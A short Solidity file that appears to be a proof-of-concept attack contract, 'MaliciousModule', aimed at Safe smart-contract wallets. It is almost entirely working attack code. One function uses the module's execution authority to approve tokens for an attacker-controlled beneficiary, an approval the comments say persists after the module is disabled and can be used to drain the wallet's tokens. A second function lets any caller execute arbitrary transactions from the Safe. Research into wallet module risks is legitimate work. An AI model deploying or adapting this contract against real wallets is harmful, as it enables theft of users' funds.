// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title MaliciousModule
 * @dev Attacker-controlled module that can be enabled on a Safe.
 * 
 * This module exploits Safe's architecture by:
 * 1. Being enabled via enableModule(address)
 * 2. Creating external state changes (ERC20 approvals) via execTransactionFromModule
 * 3. Those approvals persist even after the module is disabled
 * 
 * The vulnerability: there is no lifecycle hook that revokes side-effects
 * when a module is disabled.
 */

interface ISafe {
    function execTransactionFromModule(
        address to,
        uint256 value,
        bytes calldata data,
        uint8 operation
    ) external returns (bool success);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract MaliciousModule {
    address public safe;
    address public beneficiary;

    constructor(address _safe, address _beneficiary) {
        safe = _safe;
        beneficiary = _beneficiary;
    }

    /**
     * @dev Main attack: call this function while module is enabled.
     * It uses Safe's module execution authority to approve a token
     * for an attacker-controlled beneficiary.
     * 
     * After the module is disabled, this approval will persist
     * and can be used to drain the Safe's token balance.
     */
    function executeFullApproval(address token, uint256 amount) public {
        // Construct the ERC20 approve calldata
        // approve(address spender, uint256 amount)
        bytes memory approveCall = abi.encodeWithSignature(
            "approve(address,uint256)",
            beneficiary,
            amount
        );

        // Execute via module: Safe delegates to token contract
        ISafe(safe).execTransactionFromModule(
            token,
            0,        // no ETH value
            approveCall,
            0         // operation = CALL (not delegatecall)
        );
    }

    /**
     * @dev Alternative: execute arbitrary transaction from module.
     * Demonstrates module execution authority.
     */
    function executeArbitrary(
        address to,
        uint256 value,
        bytes calldata data
    ) public returns (bool) {
        return ISafe(safe).execTransactionFromModule(to, value, data, 0);
    }
}
